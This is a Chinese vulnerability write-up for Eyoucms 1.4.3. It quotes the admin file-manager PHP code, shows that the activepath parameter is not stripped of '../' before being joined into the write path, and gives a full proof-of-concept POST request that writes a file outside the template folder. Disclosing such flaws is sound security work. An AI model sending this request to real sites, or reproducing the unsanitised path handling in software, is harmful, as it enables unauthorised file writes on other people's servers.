<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Eyoucms 1.4.3 任意文件写入</h1><h2>一、漏洞简介</h2><p>可写入html,css,js,txt文件，总体来说比较鸡肋。</p><h2>二、漏洞影响</h2><p>Eyoucms 1.4.3</p><h2>三、复现过程</h2><h3>漏洞分析</h3><p>漏洞点只对filename进行过滤，而忘了activepath也可以../进行跳转 application/admin/controller/Filemanager.php</p><p>  if (IS_POST) {<br />         $post = input('post.', '', null);<br />         $content = input('post.content', '', null);<br />         $filename = !empty($post['filename']) ? trim($post['filename']) : '';<br />         $content = !empty($content) ? $content : '';<br />         $activepath = !empty($post['activepath']) ? trim($post['activepath']) : '';<br /><br />             ... ...<br /><br />         $r = $this-&gt;filemanagerLogic-&gt;editFile($filename, $activepath, $content);<br />         if ($r === true) {<br />             $this-&gt;success('操作成功！', url('Filemanager/index', array('activepath'=&gt;$this-&gt;filemanagerLogic-&gt;replace_path($activepath, ':', false))));<br />             exit;<br />         } else {<br />             ... ...</p><p>跟进editFile函数</p><p>application/admin/logic/FilemanagerLogic.php<br /> public function editFile($filename, $activepath = '', $content = '')<br /> {<br />     $fileinfo = pathinfo($filename);// pathinfo获取后缀<br />     $ext = strtolower($fileinfo['extension']);<br /><br />     ......<br /><br />     /*允许编辑的文件类型*/<br />     if (!in_array($ext, $this-&gt;editExt)) { //&lt;&lt;&lt;&lt;&lt;基于白名单，暂时没有想到绕过的方法&gt;&gt;&gt;&gt;&gt;<br />         return '只允许操作文件类型如下：'.implode('|', $this-&gt;editExt);<br />     }<br />     /*--end*/<br /><br />     $filename = str_replace("..", "", $filename);// 仅对filename进行过滤<br />     $file = $this-&gt;baseDir."$activepath/$filename"; // 此处直接拼接产生漏洞<br />     if (!is_writable(dirname($file))) {<br />         return "请把模板文件目录设置为可写入权限！";<br />     }<br />     if ('css' != $ext) {<br />         $content = htmlspecialchars_decode($content, ENT_QUOTES);<br />         $content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, 'intval(', $content);//<br />         // $content = preg_replace("/\?\bphp\b/i", "？ｍｕｍａ", $content);<br />     }<br />     $fp = fopen($file, "w");<br />     fputs($fp, $content);<br />     fclose($fp);<br />     return true;<br /> }</p><h3>漏洞复现</h3><h3>poc</h3><p> POST /eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;lang=cn HTTP/1.1<br /> Host: 127.0.0.1<br /> User-Agent: Mozilla/5.0 (X11; Linux i686; rv:67.0) Gecko/20100101 Firefox/67.0<br /> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br /> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br /> Accept-Encoding: gzip, deflate<br /> Content-Type: application/x-www-form-urlencoded<br /> Content-Length: 94<br /> Origin: http://127.0.0.1<br /> Connection: close<br /> Referer: http://127.0.0.1/eyoucms/login.php?m=admin&amp;c=Filemanager&amp;a=newfile&amp;activepath=%3Atemplate%3Aplugins%3Atest&amp;lang=cn<br /> Cookie: home_lang=cn; admin_lang=cn; PHPSESSID=h6k34lgf1svcatllongehqqdt0; workspaceParam=index%7CFilemanager; XDEBUG_SESSION=18705<br /> Upgrade-Insecure-Requests: 1<br /><br /> activepath=%2Ftemplate%2Fplugins%2Ftest/../../../uploads/tmp&amp;filename=newfile.htm&amp;content=test</p></body></html>